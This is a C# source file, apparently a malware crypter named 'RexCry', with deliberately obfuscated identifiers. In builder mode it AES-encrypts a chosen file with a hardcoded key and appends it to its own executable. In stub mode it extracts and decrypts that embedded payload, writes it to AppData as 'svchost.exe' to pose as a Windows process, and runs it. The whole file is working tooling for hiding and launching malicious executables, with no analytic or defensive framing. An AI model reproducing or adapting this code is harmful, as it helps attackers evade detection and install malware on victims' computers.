using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace RexCry
{
    class Program
    {
        static byte[] ftocrypt, OBIHAS, bhas12457905137ms;
        static string ambopa; 
        static int bmio124; 
        static string MiNsp11nvb6 = "==KUTAZ==";
        static void Main(string[] args)
        {
            FileInfo f = new FileInfo(System.AppDomain.CurrentDomain.FriendlyName);
            long s1 = f.Length;
            Console.WriteLine(s1);
            if (s1 > 9216)
            {
                OBIHAS = File.ReadAllBytes(System.Reflection.Assembly.GetEntryAssembly().Location);
                string nfsdfG = Convert.ToBase64String(OBIHAS);
                string[] ASDGWa = nfsdfG.Split(new string[] { "PT1LVVRBWj09" }, StringSplitOptions.None);
                byte[] nboia = Convert.FromBase64String(ASDGWa[1]);
                File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/svchost.exe", Convert.FromBase64String(KJKAJSF(nboia)));
                System.Diagnostics.Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+ "/svchost.exe");
            }
            else
            {

                Console.WriteLine("Write path to file to encrypt:");
                ambopa = Console.ReadLine();
                ftocrypt = File.ReadAllBytes(ambopa);
                OBIHAS = File.ReadAllBytes(System.Reflection.Assembly.GetEntryAssembly().Location);
                bhas12457905137ms = asddwg2yh43(OBIHAS, Encoding.ASCII.GetBytes(MiNsp11nvb6));
                bhas12457905137ms = asddwg2yh43(bhas12457905137ms, ENCASFD531(ftocrypt));
                bmio124 = OBIHAS.Length;
                File.WriteAllBytes("file.exe",bhas12457905137ms);
                Console.ReadKey();
            }
        }
        public static IEnumerable<int> PatternAt(byte[] source, byte[] pattern)
        {
            for (int i = 0; i < source.Length; i++)
            {
                if (source.Skip(i).Take(pattern.Length).SequenceEqual(pattern))
                {
                    yield return i;
                }
            }
        }
        static byte[] asddwg2yh43(byte[] arrayA, byte[] arrayB)
        {
            byte[] outputBytes = new byte[arrayA.Length + arrayB.Length];
            Buffer.BlockCopy(arrayA, 0, outputBytes, 0, arrayA.Length);
            Buffer.BlockCopy(arrayB, 0, outputBytes, arrayA.Length, arrayB.Length);
            return outputBytes;
        }
        static byte[] ENCASFD531(byte[] tobyas)
        {
            string bs56721 = Convert.ToBase64String(tobyas);
            string eckasdf = MASFGKU.NBOASaa(bs56721, "1234");
            byte[] bnpiwro = Encoding.ASCII.GetBytes(eckasdf);
            return bnpiwro;

        }
        static string KJKAJSF(byte[] asf14na)
        {
            string BNIOWJNEASGIJDVNL = Encoding.UTF8.GetString(asf14na);
            string BNAO = MASFGKU.Bniaod(BNIOWJNEASGIJDVNL, "1234");
            return BNAO;
        }

    }
    public static class MASFGKU
    {
        private const string bnoa = "pemgail9uzpgzl88";
        private const int basiop = 256;
        public static string NBOASaa(string ABNPA, string PSAWFG)
        {
            byte[] IBAJSDB = Encoding.UTF8.GetBytes(bnoa);
            byte[] aSNOBIA = Encoding.UTF8.GetBytes(ABNPA);
            PasswordDeriveBytes ABNIOP = new PasswordDeriveBytes(PSAWFG, null);
            byte[] keyBytes = ABNIOP.GetBytes(basiop / 8);
            RijndaelManaged NMPOAbmKAOP = new RijndaelManaged();
            NMPOAbmKAOP.Mode = CipherMode.CBC;
            ICryptoTransform BIONAHIAJIA = NMPOAbmKAOP.CreateEncryptor(keyBytes, IBAJSDB);
            MemoryStream MABHIOP = new MemoryStream();
            CryptoStream JOPBAJHNOIA = new CryptoStream(MABHIOP, BIONAHIAJIA, CryptoStreamMode.Write);
            JOPBAJHNOIA.Write(aSNOBIA, 0, aSNOBIA.Length);
            JOPBAJHNOIA.FlushFinalBlock();
            byte[] BONAIOBJIOPAADIOBIOA = MABHIOP.ToArray();
            MABHIOP.Close();
            JOPBAJHNOIA.Close();
            return Convert.ToBase64String(BONAIOBJIOPAADIOBIOA);
        }
        public static string Bniaod(string abnioai, string gbnasj15318)
        {
            byte[] pyh378efnv7 = Encoding.UTF8.GetBytes(bnoa);
            byte[] nbso4314 = Convert.FromBase64String(abnioai);
            PasswordDeriveBytes mn954sdvs = new PasswordDeriveBytes(gbnasj15318, null);
            byte[] keyBytes = mn954sdvs.GetBytes(basiop / 8);
            RijndaelManaged sdggsgd1245s = new RijndaelManaged();
            sdggsgd1245s.Mode = CipherMode.CBC;
            ICryptoTransform dcvdasbnoi = sdggsgd1245s.CreateDecryptor(keyBytes, pyh378efnv7);
            MemoryStream tiegpqoav = new MemoryStream(nbso4314);
            CryptoStream bdnoia = new CryptoStream(tiegpqoav, dcvdasbnoi, CryptoStreamMode.Read);
            byte[] rhwmnwiavjioaAAAAAAAAAAAAAAAA = new byte[nbso4314.Length];
            int BBNAOIJHAUIOHIOAXBHIADJA = bdnoia.Read(rhwmnwiavjioaAAAAAAAAAAAAAAAA, 0, rhwmnwiavjioaAAAAAAAAAAAAAAAA.Length);
            tiegpqoav.Close();
            bdnoia.Close();
            return Encoding.UTF8.GetString(rhwmnwiavjioaAAAAAAAAAAAAAAAA, 0, BBNAOIJHAUIOHIOAXBHIADJA);
        }
    }
}
